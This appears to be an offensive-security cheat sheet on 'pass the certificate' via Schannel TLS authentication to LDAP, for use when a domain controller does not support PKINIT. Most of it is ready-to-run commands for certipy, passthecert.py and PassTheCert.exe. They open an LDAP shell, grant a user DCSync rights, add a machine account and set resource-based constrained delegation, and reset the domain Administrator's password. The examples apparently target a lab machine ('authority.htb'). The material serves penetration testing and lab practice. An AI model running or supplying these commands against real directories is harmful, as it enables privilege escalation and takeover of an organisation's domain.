Sometimes, Domain Controllers do not support [PKINIT](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate). This can be because their certificates do not have the `Smart Card Logon` EKU. Most of the time, domain controllers return `KDC_ERR_PADATA_TYPE_NOSUPP` error when the EKU is missing. Fortunately, several protocols — including LDAP — support Schannel, thus authentication through TLS. As the term "schannel authentication" is derived from the [Schannel SSP (Security Service Provider)](https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview) which is the Microsoft SSL/TLS implementation in Windows, it is important to note that schannel authentication is a SSL/TLS client authentication.

---

### Linux
Auto
```sh
# If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key

# spawn a LDAP shell
passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell


______DCSync
# elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user), Then do DCSync
passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate
passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate


_______ RBCD
# Add computer
passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002
# Set RBCD
passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'

______Reset Password
passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target administrator -new-pass HackingViaLDAPS001


```

### Windows
-  One of the advantages of performing this attack from Windows is that we only need the `pfx` certificate file. However, defining the targets is more complex since we must use `distinguishedname` or the `SID` in most cases.
```powershell
_______DCSync
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --elevate --target DC=AUTHORITY,DC=HTB --sid S-1-5-21-622327497-3269355298-2248959698-12101

_______ RBCD 
# add computer 
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --add-computer --computer-name HTB05
# get computer SID, distinguishedName
> Get-DomainComputer -Name HTB05 -Properties objectsid
S-1-5-21-622327497-3269355298-2248959698-12603
> Get-DomainComputer -Name AUTHORITY -Properties distinguishedname
CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb
# Set RBCD
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --rbcd --target "CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb" --sid S-1-5-21-622327497-3269355298-2248959698-12603
_______Password Reset 
# get DistinguishedName
Get-DomainUser -Identity Administrator -Properties distinguishedname
CN=Administrator,CN=Users,DC=authority,DC=htb
# reset password
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx --reset-password --target CN=Administrator,CN=Users,DC=authority,DC=htb --new-password PassTheCertFromWindows001

```